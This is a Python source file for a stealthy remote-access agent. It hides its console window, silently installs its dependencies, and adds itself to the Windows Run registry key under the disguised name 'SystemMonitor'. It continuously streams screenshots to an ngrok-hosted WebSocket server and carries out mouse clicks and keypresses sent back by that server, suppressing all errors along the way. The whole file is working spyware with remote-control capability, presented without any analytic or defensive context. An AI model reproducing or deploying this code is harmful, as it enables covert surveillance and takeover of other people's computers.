import os
import sys
import json
import time
import base64
import threading
import subprocess
import io
import ctypes
import uuid
import platform

# Hide console window on Windows
if platform.system() == 'Windows':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

try:
    import pyautogui
    from PIL import Image
    import websocket
except ImportError:
    # Install dependencies silently
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyautogui', 'Pillow', 'websocket-client', '--quiet'])
    import pyautogui
    from PIL import Image
    import websocket

# Silent error handling
def log_error(msg):
    try:
        with open(os.path.join(os.path.dirname(sys.argv[0]), 'error.log'), 'a') as f:
            f.write(f"{time.time()} {msg}\n")
    except:
        pass

# Configuration
config_path = os.path.join(os.path.dirname(sys.argv[0]), 'config.json')
config = {
    'server_url': 'wss://deviation-tweak-charter.ngrok-free.dev',
    'agent_id': '',
    'agent_name': platform.node() or 'Windows-PC',
    'jpg_quality': 50,
    'fps': 1
}

if os.path.exists(config_path):
    try:
        with open(config_path) as f:
            config.update(json.load(f))
    except:
        pass

if not config['agent_id']:
    config['agent_id'] = config['agent_name'] + '-' + uuid.uuid4().hex[:8]
    try:
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
    except:
        pass

# Auto-start registry (Windows)
def setup_autostart():
    try:
        import winreg
        exe_path = sys.argv[0] if getattr(sys, 'frozen', False) else sys.executable + ' "' + __file__ + '"'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemMonitor', 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

setup_autostart()

# Screen capture
def capture_screen():
    try:
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=config['jpg_quality'], optimize=True)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        log_error(f'Capture: {e}')
        return None

# Control command handler
def handle_control(cmd, params):
    try:
        screen_w, screen_h = pyautogui.size()
        if cmd == 'mousemove':
            x = int(float(params['x']) / 100 * screen_w)
            y = int(float(params['y']) / 100 * screen_h)
            pyautogui.moveTo(x, y)
        elif cmd == 'click':
            x = int(float(params['x']) / 100 * screen_w)
            y = int(float(params['y']) / 100 * screen_h)
            btn = 'right' if params.get('button') == 2 else 'left'
            pyautogui.click(x, y, button=btn)
        elif cmd == 'keypress':
            key = params.get('key', '')
            if len(key) == 1:
                pyautogui.press(key)
    except Exception as e:
        log_error(f'Control: {e}')

# WebSocket connection
running = True
current_fps = config['fps']

def ws_connect():
    global running, current_fps
    while running:
        try:
            ws = websocket.WebSocket()
            ws.settimeout(30)
            ws.connect(config['server_url'], origin=config['server_url'])
            
            # Register as agent
            ws.send(json.dumps({
                'type': 'agent-hello',
                'agentId': config['agent_id'],
                'name': config['agent_name']
            }))
            
            # Start capture thread
            last_send = 0
            while running:
                # Check for incoming messages (control commands)
                try:
                    ws.settimeout(0.1)
                    msg = ws.recv()
                    if msg:
                        data = json.loads(msg)
                        if data.get('type') == 'set-fps':
                            current_fps = data['fps']
                        elif data.get('type') == 'control':
                            handle_control(data.get('command'), data.get('params', {}))
                except websocket.WebSocketTimeoutException:
                    pass
                except:
                    break
                
                # Send frames at configured FPS
                now = time.time()
                if now - last_send >= 1.0 / current_fps:
                    frame = capture_screen()
                    if frame:
                        try:
                            ws.send(json.dumps({
                                'type': 'agent-frame',
                                'agentId': config['agent_id'],
                                'frame': frame
                            }))
                        except:
                            break
                    last_send = now
                
        except Exception as e:
            log_error(f'Connection: {e}')
            time.sleep(5)

# Run
log_error('Agent started')
ws_connect()